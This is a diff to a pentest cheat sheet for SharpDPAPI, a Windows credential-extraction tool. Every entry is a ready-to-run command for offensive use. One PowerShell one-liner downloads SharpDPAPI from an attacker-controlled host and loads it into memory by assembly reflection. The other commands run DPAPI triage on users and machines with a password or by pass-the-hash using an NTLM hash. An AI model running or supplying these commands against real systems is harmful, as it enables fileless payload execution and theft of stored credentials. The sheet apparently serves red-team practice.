@@ -1,26 +1,39 @@
 # SharpDPAPI
 
 % SharpDPAPI, dpapi
-#plateform/windows  #target/local   #cat/CREDENTIAL-ACCESS/CREDS_RECOVER 
+#plateform/windows  #target/local   #cat/CREDENTIAL-ACCESS/DPAPI 
 
-## download into memory
+## bin - download into memory
 ```powershell
 $data = (New-Object System.Net.WebClient).DownloadData('http://<local_ip>:<port|80>/windows/NetFramework_4.7_x64/SharpDPAPI.exe'); $asm = [System.Reflection.Assembly]::Load($data); 
 ```
-
-
-## file transfert - run csharp from memory (Assembly reflection) 
+## assembly reflection - cmd
 ```powershell
-$params="<asm_ref_params>".split(" ");$OldConsoleOut = [Console]::Out; $StringWriter = New-Object IO.StringWriter ; [Console]::SetOut($StringWriter) ; $asm.EntryPoint.Invoke($null, [Object[]] @(@(,($params))));[Console]::SetOut($OldConsoleOut); $Results = $StringWriter.ToString(); $Results
+$params="<cmd>".split(" ");$OldConsoleOut = [Console]::Out; $StringWriter = New-Object IO.StringWriter ; [Console]::SetOut($StringWriter) ; $asm.EntryPoint.Invoke($null, [Object[]] @(@(,($params))));[Console]::SetOut($OldConsoleOut); $Results = $StringWriter.ToString(); $Results
 ```
-= asm_ref_params: -group=user -full
 
-## Triage user
+## ps1 - cmd
+```powershell
+Invoke-SharpDPAPI "<cmd>"
+```
+
+## bin - user triage (creds)
 ```powershell
 SharpDPAPI.exe triage /password:<password>
 ```
 
-## Triage user (assembly reflection)
+## bin - user triage (pth)
 ```powershell
-$params="triage /password:<password>".split(" ");$OldConsoleOut = [Console]::Out; $StringWriter = New-Object IO.StringWriter ; [Console]::SetOut($StringWriter) ; $asm.EntryPoint.Invoke($null, [Object[]] @(@(,($params))));[Console]::SetOut($OldConsoleOut); $Results = $StringWriter.ToString(); $Results
+SharpDPAPI.exe triage /ntlm:<nt_hash>
 ```
+
+## bin - machine triage (creds)
+```powershell
+SharpDPAPI.exe machinetriage /password:<password>
+```
+
+## bin - machine triage (pth)
+```powershell
+SharpDPAPI.exe machinetriage /ntlm:<nt_hash>
+```
+
